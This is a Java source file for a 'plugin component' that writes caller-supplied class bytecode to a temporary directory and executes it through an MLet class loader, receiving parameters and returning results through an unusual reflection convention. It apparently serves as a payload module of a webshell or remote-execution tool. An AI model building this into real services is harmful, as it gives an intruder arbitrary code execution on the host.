package org.leo.core.component;

import javax.management.loading.MLet;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

/**
 * 插件组件
 * 提供动态加载和执行Java插件功能，兼容Java 1.5+
 * 
 * @author LeoSpring
 * @version 2.1
 */
public class PluginComponent implements Runnable {

    
    private HashMap<String, Object> params;
    private HashMap<String, Object> results;

    
    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = copyStringObjectMap(h.invoke(null, null, null));
            results = new java.util.HashMap<String, Object>();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap<String, Object>();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }


    /**
     * 主要执行方法
     */
    public void invoke() throws Exception {
        byte[] bytecode = (byte[]) params.get("pluginBytecode");
        HashMap<String, Object> pluginParam = copyStringObjectMap(params.get("pluginParam"));

        if (bytecode == null || bytecode.length == 0) {
            throw new IllegalArgumentException("pluginBytecode 不能为空");
        }

        Class<?> pluginClass = loadPluginClass(bytecode);
        
        // 创建插件实例并执行
        Object pluginInstance = pluginClass.getDeclaredConstructor().newInstance();
        pluginInstance.equals(pluginParam);
        
        // 获取执行结果
        String result = pluginInstance.toString();
        results.put("result", result);
        results.put("code", 200);
    }

    /**
     * 通过 MLet 的公共 URLClassLoader 能力加载插件。
     *
     * <p>不能反射调用 ClassLoader#defineClass：Java 9+ 模块系统默认不开放
     * java.lang，JDK 17 上会抛 InaccessibleObjectException。这里把单个 class
     * 暂存到独立目录后由 MLet.loadClass() 加载，兼容 Java 6 到现代 JDK。
     */
    private Class<?> loadPluginClass(byte[] bytecode) throws Exception {
        String className = readClassName(bytecode);
        File root = createTempDirectory();
        File classFile = new File(root, className.replace('.', File.separatorChar) + ".class");
        File parent = classFile.getParentFile();
        if (parent != null && !parent.exists() && !parent.mkdirs() && !parent.isDirectory()) {
            throw new IOException("无法创建插件临时目录: " + parent.getAbsolutePath());
        }

        FileOutputStream out = null;
        try {
            out = new FileOutputStream(classFile);
            out.write(bytecode);
        } finally {
            if (out != null) {
                try { out.close(); } catch (IOException ignored) {}
            }
        }

        try {
            MLet mlet = new MLet(new URL[]{root.toURI().toURL()},
                    Thread.currentThread().getContextClassLoader());
            return Class.forName(className, true, mlet);
        } finally {
            deleteTree(root);
        }
    }

    /** 从 class 常量池读取 this_class 对应的二进制类名。 */
    private String readClassName(byte[] bytecode) throws IOException {
        DataInputStream in = new DataInputStream(new ByteArrayInputStream(bytecode));
        try {
            if (in.readInt() != 0xCAFEBABE) {
                throw new IOException("pluginBytecode 不是有效的 class 文件");
            }
            in.readUnsignedShort(); // minor_version
            in.readUnsignedShort(); // major_version
            int constantPoolCount = in.readUnsignedShort();
            String[] utf8 = new String[constantPoolCount];
            int[] classNameIndexes = new int[constantPoolCount];
            for (int i = 1; i < constantPoolCount; i++) {
                int tag = in.readUnsignedByte();
                if (tag == 1) {
                    utf8[i] = in.readUTF();
                } else if (tag == 3 || tag == 4 || tag == 9 || tag == 10
                        || tag == 11 || tag == 12 || tag == 17 || tag == 18) {
                    in.readInt();
                } else if (tag == 5 || tag == 6) {
                    in.readLong();
                    i++; // long/double 占两个常量池槽位
                } else if (tag == 7) {
                    classNameIndexes[i] = in.readUnsignedShort();
                } else if (tag == 8 || tag == 16 || tag == 19 || tag == 20) {
                    in.readUnsignedShort();
                } else if (tag == 15) {
                    in.readUnsignedByte();
                    in.readUnsignedShort();
                } else {
                    throw new IOException("不支持的 class 常量池标签: " + tag);
                }
            }
            in.readUnsignedShort(); // access_flags
            int thisClass = in.readUnsignedShort();
            if (thisClass <= 0 || thisClass >= classNameIndexes.length) {
                throw new IOException("class 文件中的 this_class 无效");
            }
            int nameIndex = classNameIndexes[thisClass];
            if (nameIndex <= 0 || nameIndex >= utf8.length || utf8[nameIndex] == null) {
                throw new IOException("class 文件中的类名无效");
            }
            String internalName = utf8[nameIndex];
            if (internalName.length() == 0 || internalName.charAt(0) == '/'
                    || internalName.indexOf("..") >= 0) {
                throw new IOException("class 文件中的类名不安全: " + internalName);
            }
            return internalName.replace('/', '.');
        } finally {
            try { in.close(); } catch (IOException ignored) {}
        }
    }

    private File createTempDirectory() throws IOException {
        File base = new File(System.getProperty("java.io.tmpdir"));
        File dir = new File(base, "leo-plugin-" + UUID.randomUUID().toString());
        if (!dir.mkdirs() && !dir.isDirectory()) {
            throw new IOException("无法创建插件临时目录: " + dir.getAbsolutePath());
        }
        return dir;
    }

    private void deleteTree(File file) {
        if (file == null || !file.exists()) return;
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (int i = 0; i < children.length; i++) {
                    deleteTree(children[i]);
                }
            }
        }
        if (!file.delete()) {
            file.deleteOnExit();
        }
    }

    private static HashMap<String, Object> copyStringObjectMap(Object value) {
        HashMap<String, Object> copy = new HashMap<String, Object>();
        if (!(value instanceof Map)) {
            return copy;
        }
        Map<?, ?> source = (Map<?, ?>) value;
        for (Map.Entry<?, ?> entry : source.entrySet()) {
            if (entry.getKey() instanceof String) {
                copy.put((String) entry.getKey(), entry.getValue());
            }
        }
        return copy;
    }
}
